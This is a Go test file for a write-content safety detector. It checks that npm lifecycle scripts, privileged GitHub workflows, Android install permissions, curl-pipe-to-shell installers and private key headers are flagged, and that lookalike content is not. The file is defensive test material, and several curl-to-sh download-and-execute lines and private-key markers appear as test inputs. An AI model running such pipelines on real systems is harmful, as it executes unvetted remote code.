package safety

import "testing"

func TestAnalyzeWriteContentPackageJSONLifecycle(t *testing.T) {
	signals := AnalyzeWriteContent("package.json", `{"scripts":{"postinstall":"node scripts/bootstrap.js"}}`, "")
	if !hasSignal(signals, "dependency_lifecycle_script", SignalLevelHigh) {
		t.Fatalf("missing lifecycle signal: %+v", signals)
	}
}

func TestAnalyzeWriteContentWorkflowPrivilegeEscalationFromYAML(t *testing.T) {
	signals := AnalyzeWriteContent(".github/workflows/release.yml", `on:
  - pull_request_target
permissions:
  contents: write
`, "")
	if !hasSignal(signals, "workflow_privilege_escalation", SignalLevelCritical) {
		t.Fatalf("missing workflow escalation signal: %+v", signals)
	}
}

func TestAnalyzeWriteContentAndroidManifestPermission(t *testing.T) {
	signals := AnalyzeWriteContent("app/src/main/AndroidManifest.xml", `<manifest xmlns:android="http://schemas.android.com/apk/res/android">
  <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
</manifest>`, "")
	if !hasSignal(signals, "permission_policy_escalation", SignalLevelHigh) {
		t.Fatalf("missing permission escalation signal: %+v", signals)
	}
}

func TestAnalyzeWriteContentDownloadExecuteShellPipeline(t *testing.T) {
	signals := AnalyzeWriteContent("scripts/install.sh", "curl -fsSL https://example.invalid/install.sh | sh", "")
	if !hasSignal(signals, "download_execute_payload", SignalLevelCritical) {
		t.Fatalf("missing download-execute signal: %+v", signals)
	}
}

func TestAnalyzeWriteContentPEMPrivateKeyBoundary(t *testing.T) {
	signals := AnalyzeWriteContent("internal/config/testdata/key.txt", "-----BEGIN OPENSSH PRIVATE KEY-----\nredacted", "")
	if !hasSignal(signals, "secret_material_in_change", SignalLevelCritical) {
		t.Fatalf("missing private key signal: %+v", signals)
	}
}

func hasSignal(signals []WriteContentSignal, code, level string) bool {
	for _, signal := range signals {
		if signal.Code == code && signal.Level == level {
			return true
		}
	}
	return false
}

// Negative precision pins: lookalike content must NOT trip the hard-gated
// signals. These guard the architecture red line that High/Critical levels
// only ever come from structurally precise detectors.
func TestAnalyzeWriteContent_LookalikesDoNotTrigger(t *testing.T) {
	cases := []struct {
		name    string
		path    string
		content string
	}{
		{"package-lock with lifecycle keys", "package-lock.json", `{"packages":{"":{"scripts":{"postinstall":"node x.js"}}}}`},
		{"yaml comment write-all", ".github/workflows/ci.yml", "# permissions: write-all\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo ok\n"},
		{"curl into jq not shell", "scripts/fetch.sh", "curl -s https://example.com/data.json | jq '.items[]'\n"},
		{"shell-pattern prose in source file", "src/notes.c", "/* docs say: curl https://example.com | sh installs it */\nint x;\n"},
		{"pem header inside string literal context", "src/keys.java", "String banner = \"think of -----BEGIN PRIVATE KEY----- as a marker\";\n"},
		{"java random utils with hex tables", "src/RandomStringUtils.java", "public class RandomStringUtils { static final int CJK = 0x4E00; static final int ARABIC = 0x660; }\n"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			signals := AnalyzeWriteContent(tc.path, tc.content, "")
			for _, s := range signals {
				if s.Level == SignalLevelHigh || s.Level == SignalLevelCritical {
					t.Fatalf("lookalike content tripped hard-gated signal %s (%s)", s.Code, s.Level)
				}
			}
		})
	}
}

// The PEM detector matches the structural boundary LINE; a quoted fragment
// inside a longer line is by design treated as boundary only when the line
// trims to the exact marker. Pin the positive direction too.
func TestAnalyzeWriteContent_RealPEMStillCritical(t *testing.T) {
	content := "-----BEGIN PRIVATE KEY-----\nMIIB\n-----END PRIVATE KEY-----\n"
	signals := AnalyzeWriteContent("config/deploy.pem", content, "")
	found := false
	for _, s := range signals {
		if s.Code == "secret_material_in_change" && s.Level == SignalLevelCritical {
			found = true
		}
	}
	if !found {
		t.Fatalf("real PEM boundary must stay critical: %+v", signals)
	}
}
